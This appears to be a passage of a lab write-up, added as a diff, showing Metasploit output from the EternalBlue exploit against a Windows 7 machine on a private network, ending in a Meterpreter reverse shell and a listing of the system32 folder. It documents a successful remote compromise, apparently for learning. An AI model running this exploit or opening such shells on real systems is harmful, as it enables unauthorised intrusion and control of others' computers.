+[+] 192.168.150.128:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 192.168.150.128:445 - Sending egg to corrupted connection.
+[*] 192.168.150.128:445 - Triggering free of corrupted buffer.
+[*] Sending stage (203846 bytes) to 192.168.150.128
+[+] 192.168.150.128:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.150.128:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.150.128:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] Meterpreter session 1 opened (192.168.150.131:4444 -> 192.168.150.128:49166) at 2024-11-21 01:47:33 -0500
+
+
+You can see we get the Access of window 7
+====================================================================================================================================================
+
+meterpreter > ls
+Listing: C:\Windows\system32
+============================
+
+Mode              Size      Type  Last modified              Name
+----              ----      ----  -------------              ----
+040777/rwxrwxrwx  0         dir   2009-07-14 01:42:33 -0400  0409
+100666/rw-rw-rw-  13504     fil   2024-11-21 01:21:29 -0500  7B296FB0-376B-497e-B012-9C450E1B7327-5P-0.C7483456-A289-439d-8
+                                                             115-601632D005A0
+100666/rw-rw-rw-  13504     fil   2024-11-21 01:21:29 -0500  7B296FB0-376B-497e-B012-9C450E1B7327-5P-1.C7483456-A289-439d-8
+                                                             115-601632D005A0
+====================================================================================================================================================
+
